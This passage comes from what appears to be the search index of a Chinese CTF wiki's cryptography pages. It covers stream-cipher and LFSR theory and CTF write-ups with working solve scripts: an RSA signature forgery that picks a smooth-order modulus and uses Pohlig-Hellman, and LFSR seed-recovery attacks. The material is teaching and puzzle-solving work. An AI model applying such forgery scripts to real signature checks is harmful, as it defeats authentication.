h(m)\uff0cpad(m) \u3002\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u5269\u4e0b\u7684\u6570\u5373\u53ef\uff0c\u8fd9\u91cc\u6211\u4eec\u6784\u9020 n \u4e3a\u7d20\u6570\uff0c\u4f7f\u5f97 n-1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528 pohlig_hellman \u7b97\u6cd5\u4e86\u3002 from Crypto.Hash import SHA from pwn import * import gmpy2 from gmpy2 import is_prime import random def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) #context.log_level = 'debug' def gen_smooth_num ( plist , minnum = pow ( 2 , 1020 )): lenp = len ( plist ) while True : n = 1 factors = dict () while n + 1 < minnum : tmp = random . randint ( 0 , lenp - 1 ) n *= plist [ tmp ] if plist [ tmp ] in factors : factors [ plist [ tmp ]] += 1 else : factors [ plist [ tmp ]] = 1 if n . bit_length () > 1024 : continue if is_prime ( n + 1 ): return n + 1 , factors # http://pythonexample.com/snippet/pohligpy_neuratron_python # solve g^x=h mod m def log_prime_power ( g , h , pf , pe , M ): powers = [ pf ** k for k in range ( pe )] gamma = gmpy2 . powmod ( g , powers [ - 1 ], M ) xk = gmpy2 . mpz ( 0 ) for k in range ( pe ): if k == 0 : hk = gmpy2 . powmod ( h , powers [ pe - k - 1 ], M ) else : gk = gmpy2 . powmod ( g , xk * ( M - 2 ), M ) hk = gmpy2 . powmod ( gk * h , powers [ pe - k - 1 ], M ) k_log_found = False for dk in range ( pf ): yk = gmpy2 . powmod ( gamma , dk , M ) if yk == hk : k_log_found = True break if not k_log_found : raise Exception ( \"can not solve\" ) xk += gmpy2 . mul ( powers [ k ], dk ) return xk def pohlig_hellman ( g , h , M , factors ): M1 = M - 1 xs = [] for f in factors : pf = f pe = factors [ f ] subgroup_exponent = gmpy2 . div ( M1 , gmpy2 . powmod ( pf , pe , M )) gi = gmpy2 . powmod ( g , subgroup_exponent , M ) hi = gmpy2 . powmod ( h , subgroup_exponent , M ) xi = log_prime_power ( gi , hi , pf , pe , M ) xs . append ( xi ) crt_coeffs = [] for f in factors : pf = f pe = factors [ f ] mi = pf ** pe bi = gmpy2 . div ( M , mi ) bi_inv = gmpy2 . invert ( bi , mi ) crt_coeffs . append ( gmpy2 . mul ( bi , bi_inv )) x = 0 for i in range ( len ( crt_coeffs )): x = gmpy2 . t_mod ( x + gmpy2 . t_mod ( xs [ i ] * crt_coeffs [ i ], M1 ), M1 ) return x #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) signature = int ( signature , 16 ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) print m , signature plist = [] for i in range ( 2 , 1000 ): if is_prime ( i ): plist . append ( i ) while True : try : n , factors = gen_smooth_num ( plist , signature ) e = pohlig_hellman ( signature , m , n , factors ) except Exception as e : continue else : break print n , e print m print gmpy2 . powmod ( signature , e , n ) p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6709\u4e24\u70b9\u9700\u8981\u6ce8\u610f \u7531\u4e8e g^x=y g^x=y \u4e2d\u7684 g \u548c y \u90fd\u662f\u7ed9\u5b9a\u7684\uff0c\u6211\u4eec\u65b0\u627e\u5230\u7684 n\uff0c\u4e0d\u4e00\u5b9a g \u7684\u5e42\u6b21\u6784\u6210\u7684\u7fa4\u4f1a\u5305\u542b y\uff0c\u6240\u4ee5\u53ef\u80fd\u6c42\u89e3\u5931\u8d25\uff0c\u6240\u4ee5\u9700\u8981\u591a\u6b21\u6c42\u89e3\u3002 \u6e90\u4ee3\u7801\u4e2d\u867d\u7136 n.bit_length() <= 1025 \uff0c\u4f46\u662f\u5176\u5b9e n \u5728\u6ee1\u8db3\u4e0d\u5c0f\u4e8e signature \u7684\u6761\u4ef6\u65f6\uff0c\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff08pycrypto \u6e90\u7801\uff09 modBits = Crypto . Util . number . size ( self . _key . n ) k = ceil_div ( modBits , 8 ) # Convert from bits to bytes # Step 1 if len ( S ) != k : return 0 \u6240\u4ee5\u6211\u4eec\u6700\u597d\u8bbe\u7f6e n \u4e3a1024 \u6bd4\u7279\u4f4d\u3002","title":"2018 Backdoor Awesome mix2"},{"location":"crypto/streamcipher/intro/","text":"\u6d41\u5bc6\u7801 \u00b6 \u6d41\u5bc6\u7801\u4e00\u822c\u9010\u5b57\u8282\u6216\u8005\u9010\u6bd4\u7279\u5904\u7406\u4fe1\u606f\u3002\u4e00\u822c\u6765\u8bf4 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u957f\u5ea6\u4f1a\u4e0e\u660e\u6587\u7684\u957f\u5ea6\u76f8\u540c\u3002 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u6d3e\u751f\u81ea\u4e00\u4e2a\u8f83\u77ed\u7684\u5bc6\u94a5\uff0c\u6d3e\u751f\u7b97\u6cd5\u901a\u5e38\u4e3a\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d41\u52a0\u5bc6\u76ee\u524d\u6765\u8bf4\u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u751f\u6210\u7684\u5e8f\u5217\u7684\u968f\u673a\u6027\u8d8a\u5f3a\uff0c\u660e\u6587\u4e2d\u7684\u7edf\u8ba1\u7279\u5f81\u88ab\u8986\u76d6\u7684\u66f4\u597d\u3002 \u6d41\u5bc6\u7801\u52a0\u89e3\u5bc6\u975e\u5e38\u7b80\u5355\uff0c\u5728\u5df2\u77e5\u660e\u6587\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u83b7\u53d6\u5bc6\u94a5\u6d41\u3002 \u6d41\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u8bbe\u8ba1\u597d\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u57fa\u672c\u6784\u9020\u6a21\u5757\u4e3a\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u4e00\u4e9b\u7279\u6b8a\u8bbe\u8ba1\u7684\u6d41\u5bc6\u7801\uff0c\u6bd4\u5982 RC4\u3002","title":"\u6d41\u5bc6\u7801"},{"location":"crypto/streamcipher/intro/#_1","text":"\u6d41\u5bc6\u7801\u4e00\u822c\u9010\u5b57\u8282\u6216\u8005\u9010\u6bd4\u7279\u5904\u7406\u4fe1\u606f\u3002\u4e00\u822c\u6765\u8bf4 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u957f\u5ea6\u4f1a\u4e0e\u660e\u6587\u7684\u957f\u5ea6\u76f8\u540c\u3002 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u6d3e\u751f\u81ea\u4e00\u4e2a\u8f83\u77ed\u7684\u5bc6\u94a5\uff0c\u6d3e\u751f\u7b97\u6cd5\u901a\u5e38\u4e3a\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d41\u52a0\u5bc6\u76ee\u524d\u6765\u8bf4\u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u751f\u6210\u7684\u5e8f\u5217\u7684\u968f\u673a\u6027\u8d8a\u5f3a\uff0c\u660e\u6587\u4e2d\u7684\u7edf\u8ba1\u7279\u5f81\u88ab\u8986\u76d6\u7684\u66f4\u597d\u3002 \u6d41\u5bc6\u7801\u52a0\u89e3\u5bc6\u975e\u5e38\u7b80\u5355\uff0c\u5728\u5df2\u77e5\u660e\u6587\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u83b7\u53d6\u5bc6\u94a5\u6d41\u3002 \u6d41\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u8bbe\u8ba1\u597d\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u57fa\u672c\u6784\u9020\u6a21\u5757\u4e3a\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u4e00\u4e9b\u7279\u6b8a\u8bbe\u8ba1\u7684\u6d41\u5bc6\u7801\uff0c\u6bd4\u5982 RC4\u3002","title":"\u6d41\u5bc6\u7801"},{"location":"crypto/streamcipher/fsr/intro/","text":"\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 \u00b6 \u4e00\u822c\u7684\uff0c\u4e00\u4e2a n \u7ea7\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u5982\u4e0b\u56fe\u6240\u793a \u5176\u4e2d a_0 a_0 \uff0c a_1 a_1 \uff0c\u2026\uff0c a_{n-1} a_{n-1} \uff0c\u4e3a\u521d\u6001\u3002 F \u4e3a\u53cd\u9988\u51fd\u6570\u6216\u8005\u53cd\u9988\u903b\u8f91\u3002\u5982\u679c F \u4e3a\u7ebf\u6027\u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u5176\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\uff0c\u5426\u5219\u6211\u4eec\u79f0\u5176\u4e3a\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08NFSR\uff09\u3002 a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u90fd\u4f1a\u5b9a\u4e49\u5728\u67d0\u4e2a\u6709\u9650\u57df\u4e0a\uff0c\u4ece\u800c\u907f\u514d\u6570\u5b57\u592a\u5927\u548c\u592a\u5c0f\u7684\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u540c\u4e00\u4e2a\u7a7a\u95f4\u4e2d\u7684\u53d8\u6362\uff0c\u5373 (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) . \u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\u6765\u8bf4\uff0c\u6211\u4eec\u4e00\u822c\u5b9a\u4e49\u5176\u751f\u6210\u51fd\u6570\u4e3a\u5176\u5e8f\u5217\u5bf9\u5e94\u7684\u5e42\u7ea7\u6570\u7684\u548c\u3002","title":"\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/intro/#_1","text":"\u4e00\u822c\u7684\uff0c\u4e00\u4e2a n \u7ea7\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u5982\u4e0b\u56fe\u6240\u793a \u5176\u4e2d a_0 a_0 \uff0c a_1 a_1 \uff0c\u2026\uff0c a_{n-1} a_{n-1} \uff0c\u4e3a\u521d\u6001\u3002 F \u4e3a\u53cd\u9988\u51fd\u6570\u6216\u8005\u53cd\u9988\u903b\u8f91\u3002\u5982\u679c F \u4e3a\u7ebf\u6027\u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u5176\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\uff0c\u5426\u5219\u6211\u4eec\u79f0\u5176\u4e3a\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08NFSR\uff09\u3002 a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u90fd\u4f1a\u5b9a\u4e49\u5728\u67d0\u4e2a\u6709\u9650\u57df\u4e0a\uff0c\u4ece\u800c\u907f\u514d\u6570\u5b57\u592a\u5927\u548c\u592a\u5c0f\u7684\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u540c\u4e00\u4e2a\u7a7a\u95f4\u4e2d\u7684\u53d8\u6362\uff0c\u5373 (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) . \u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\u6765\u8bf4\uff0c\u6211\u4eec\u4e00\u822c\u5b9a\u4e49\u5176\u751f\u6210\u51fd\u6570\u4e3a\u5176\u5e8f\u5217\u5bf9\u5e94\u7684\u5e42\u7ea7\u6570\u7684\u548c\u3002","title":"\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/lfsr/","text":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 - LFSR \u00b6 \u4ecb\u7ecd \u00b6 \u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u53cd\u9988\u51fd\u6570\u4e00\u822c\u5982\u4e0b a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} \u5176\u4e2d\uff0c c_j c_j \u5747\u5728\u67d0\u4e2a\u6709\u9650\u57df F_q F_q \u4e2d\u3002 \u65e2\u7136\u7ebf\u6027\u7a7a\u95f4\u662f\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u7ebf\u6027\u53d8\u6362\u4e3a \\begin{align*} &\\left[ a_{i+1},a_{i+2},a_{i+3}, ...,a_{i+n} \\right]\\\\\\\\=&\\left[ a_{i},a_{i+1},a_{i+2}, ...,a_{i+n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]\\\\\\\\=&\\left[ a_{0},a_{1},a_{2}, ...,a_{n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]^{i+1} \\end{align*} \\begin{align*} &\\left[ a_{i+1},a_{i+2},a_{i+3}, ...,a_{i+n} \\right]\\\\\\\\=&\\left[ a_{i},a_{i+1},a_{i+2}, ...,a_{i+n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]\\\\\\\\=&\\left[ a_{0},a_{1},a_{2}, ...,a_{n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]^{i+1} \\end{align*} \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u5176\u7279\u5f81\u591a\u9879\u5f0f\u4e3a f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} \u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u5176\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \u6211\u4eec\u4e5f\u79f0\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u8054\u7ed3\u591a\u9879\u5f0f\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u5b9a\u7406\u9700\u8981\u6211\u4eec\u8bb0\u4e00\u4e0b\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002 \u7279\u5f81\u591a\u9879\u5f0f\u4e0e\u751f\u6210\u51fd\u6570 \u00b6 \u5df2\u77e5\u67d0\u4e2a n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u7279\u5f81\u591a\u9879\u5f0f\uff0c\u90a3\u4e48\u8be5\u5e8f\u5217\u5bf9\u5e94\u7684\u751f\u6210\u51fd\u6570\u4e3a A(x)=\\frac{p(x)}{\\overline f(x)} A(x)=\\frac{p(x)}{\\overline f(x)} \u5176\u4e2d\uff0c p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) \u3002\u53ef\u4ee5\u770b\u51fa p(x) \u5b8c\u5168\u7531\u521d\u59cb\u72b6\u6001\u548c\u53cd\u9988\u51fd\u6570\u7684\u7cfb\u6570\u51b3\u5b9a\u3002 \u5e8f\u5217\u5468\u671f\u4e0e\u751f\u6210\u51fd\u6570 \u00b6 \u5e8f\u5217\u7684\u7684\u5468\u671f\u4e3a\u5176\u751f\u6210\u51fd\u6570\u7684\u65e2\u7ea6\u771f\u5206\u5f0f\u7684\u5206\u6bcd\u7684\u5468\u671f\u3002 \u5bf9\u4e8e n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u6700\u957f\u5468\u671f\u4e3a 2^{n}-1 2^{n}-1 \uff08\u6392\u9664\u5168\u96f6\uff09\u3002\u8fbe\u5230\u6700\u957f\u5468\u671f\u7684\u5e8f\u5217\u4e00\u822c\u79f0\u4e3a m \u5e8f\u5217\u3002 \u7279\u6b8a\u6027\u8d28 \u00b6 \u5c06\u4e24\u4e2a\u5e8f\u5217\u7d2f\u52a0\u5f97\u5230\u65b0\u7684\u5e8f\u5217\u7684\u5468\u671f\u4e3a\u8fd9\u4e24\u4e2a\u5e8f\u5217\u7684\u5468\u671f\u7684\u548c\u3002 \u5e8f\u5217\u662f n \u7ea7 m \u5e8f\u5217\uff0c\u5f53\u4e14\u4ec5\u5f53\u5e8f\u5217\u7684\u6781\u5c0f\u591a\u9879\u5f0f\u662f n \u6b21\u672c\u539f\u591a\u9879\u5f0f\u3002 B-M \u7b97\u6cd5 \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e24\u79cd\u89d2\u5ea6\u6765\u8003\u8651 LFSR \u5bc6\u94a5\u751f\u6210\u89d2\u5ea6\uff0c\u4e00\u822c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u7ea7\u6570\u5c3d\u53ef\u80fd\u4f4e\u7684 LFSR \u6765\u751f\u6210\u5468\u671f\u5927\uff0c\u968f\u673a\u6027\u597d\u7684\u5e8f\u5217\u3002 \u5bc6\u7801\u5206\u6790\u89d2\u5ea6\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u5e8f\u5217 a\uff0c\u5982\u4f55\u6784\u9020\u4e00\u4e2a\u7ea7\u6570\u5c3d\u53ef\u80fd\u5c0f\u7684 LFSR \u6765\u751f\u6210\u5b83\u3002\u5176\u5b9e\u8fd9\u5c31\u662f B-M \u7b97\u6cd5\u7684\u6765\u6e90\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5e8f\u5217\u7684\u7ebf\u6027\u590d\u6742\u5ea6\u5982\u4e0b \u82e5 s \u4e3a\u4e00\u4e2a\u5168\u96f6\u5e8f\u5217\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a0\u3002 \u82e5\u6ca1\u6709 LFSR \u80fd\u751f\u6210 s\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u65e0\u7a77\u3002 \u5426\u5219\uff0cs \u7684\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u751f\u6210 L(s) \u7684\u6700\u5c0f\u7ea7\u7684 LFSR\u3002 BM \u7b97\u6cd5\u7684\u8981\u6c42\u6211\u4eec\u9700\u8981\u77e5\u9053\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\u3002\u5176\u590d\u6742\u5ea6 \u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n^2) \u6b21\u6bd4\u7279\u64cd\u4f5c \u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n) \u6bd4\u7279\u3002 \u5173\u4e8e BM \u7b97\u6cd5\u7684\u7ec6\u8282\uff0c\u540e\u7eed\u6dfb\u52a0\uff0c\u76ee\u524d\u5904\u4e8e\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u3002 \u4f46\u662f\u5176\u5b9e\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e00\u79cd\u6bd4\u8f83\u7b28\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u539f\u5148\u7684\u5e8f\u5217\u3002\u4e0d\u59a8\u5047\u8bbe\u5df2\u77e5\u7684\u5e8f\u5217\u4e3a a_1,...,a_{2n} a_1,...,a_{2n} \uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 S_1=(a_1,...,a_n) S_1=(a_1,...,a_n) S_2=(a_2,...,a_{n+1}) S_2=(a_2,...,a_{n+1}) .... S_{n+1}=(a_{n+1},...,a_{2n}) S_{n+1}=(a_{n+1},...,a_{2n}) \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u77e9\u9635 X=(S_1,...,S_n) X=(S_1,...,S_n) \uff0c\u90a3\u4e48 S_{n+1}=(c_n,...,c_1)X S_{n+1}=(c_n,...,c_1)X \u6240\u4ee5 (c_n,...,c_1)=S_{n+1}X^{-1} (c_n,...,c_1)=S_{n+1}X^{-1} \u8fdb\u800c\u6211\u4eec\u4e5f\u5c31\u77e5\u9053\u4e86 LFSR \u7684\u53cd\u9988\u8868\u8fbe\u5f0f\uff0c\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u51fa\u521d\u59cb\u5316\u79cd\u5b50\u3002 2018 \u5f3a\u7f51\u676f streamgame1 \u00b6 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 25 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) R = int ( flag [ 5 : - 1 ], 2 ) mask = 0b1010011000100011100 f = open ( \"key\" , \"ab\" ) for i in range ( 12 ): tmp = 0 for j in range ( 8 ): ( R , out ) = lfsr ( R , mask ) tmp = ( tmp << 1 ) ^ out f . write ( chr ( tmp )) f . close () \u53ef\u4ee5\u53d1\u73b0\uff0cflag \u7684\u957f\u5ea6\u4e3a25-5-1=19\uff0c\u6240\u4ee5\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e\u3002\u7ed3\u679c \u279c 2018 -\u5f3a\u7f51\u676f-streamgame1 git: ( master ) \u2717 python exp.py 12 0b1110101100001101011 \u56e0\u6b64 flag \u4e3a flag{1110101100001101011}\u3002 2018 CISCN \u521d\u8d5b oldstreamgame \u00b6 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee flag = \"flag{xxxxxxxxxxxxxxxx}\" assert flag.startswith ( \"flag{\" ) assert flag.endswith ( \"}\" ) assert len ( flag )== 14 def lfsr ( R,mask ) : output = ( R << 1) & 0xffffffff i=(R&mask)&0xffffffff lastbit=0 while i!=0: lastbit^=(i&1 ) i = i>>1 output^ = lastbit return ( output,lastbit ) R = int ( flag [ 5 :-1 ] ,16 ) mask = 0b10100100000010000000100010010100 f = open ( \"key\" , \"w\" ) for i in range ( 100 ) : tmp = 0 for j in range ( 8 ) : ( R,out )= lfsr ( R,mask ) tmp =( tmp << 1 ) ^out f.write ( chr ( tmp )) f.close () \u7a0b\u5e8f\u5f88\u7b80\u5355\uff0c\u4ecd\u7136\u662f\u4e00\u4e2a LFSR\uff0c\u4f46\u662f\u521d\u6001\u662f 32 \u6bd4\u7279\u4f4d\uff0c\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u7206\u7834\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u9009\u62e9\u7206\u7834\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e24\u79cd\u505a\u6cd5\u3002 \u7b2c\u4e00\u79cd\u505a\u6cd5\uff0c\u7a0b\u5e8f\u8f93\u51fa\u7684\u7b2c 32 \u4e2a\u6bd4\u7279\u662f\u7531\u7a0b\u5e8f\u8f93\u51fa\u7684\u524d 31 \u4e2a\u6bd4\u7279\u548c\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u6765\u51b3\u5b9a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c\u4e00\u4e2a\u6bd4\u7279\uff0c\u8fdb\u800c\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 2 \u4e2a\u6bd4\u7279\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u4ee3\u7801\u5982\u4e0b mask = 0b10100100000010000000100010010100 b = '' N = 32 with open ( 'key' , 'rb' ) as f : b = f . read () key = '' for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): key += str ( t >> j & 1 ) idx = 0 ans = \"\" key = key [ 31 ] + key [: 32 ] while idx < 32 : tmp = 0 for i in range ( 32 ): if mask >> i & 1 : tmp ^= int ( key [ 31 - i ]) ans = str ( tmp ) + ans idx += 1 key = key [ 31 ] + str ( tmp ) + key [ 1 : 31 ] num = int ( ans , 2 ) print hex ( num ) \u8fd0\u884c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 python exp1.py 0x926201d7 \u7b2c\u4e8c\u79cd\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u77e9\u9635\u8f6c\u6362\u7684\u8fc7\u7a0b\uff0c\u5982\u679c\u8fdb\u884c\u4e86 32 \u6b21\u7ebf\u6027\u53d8\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u6d41\u524d 32 \u4e2a\u6bd4\u7279\u3002\u800c\u5176\u5b9e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u524d 32 \u4e2a\u6bd4\u7279\u5c31\u53ef\u4ee5\u6062\u590d\u521d\u59cb\u72b6\u6001\u4e86\u3002 mask = 0b10100100000010000000100010010100 N = 32 F = GF ( 2 ) b = '' with open ( 'key' , 'rb' ) as f : b = f . read () R = [ vector ( F , N ) for i in range ( N )] for i in range ( N ): R [ i ][ N - 1 ] = mask >> ( 31 - i ) & 1 for i in range ( N - 1 ): R [ i + 1 ][ i ] = 1 M = Matrix ( F , R ) M = M ^ N vec = vector ( F , N ) row = 0 for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): vec [ row ] = t >> j & 1 row += 1 print rank 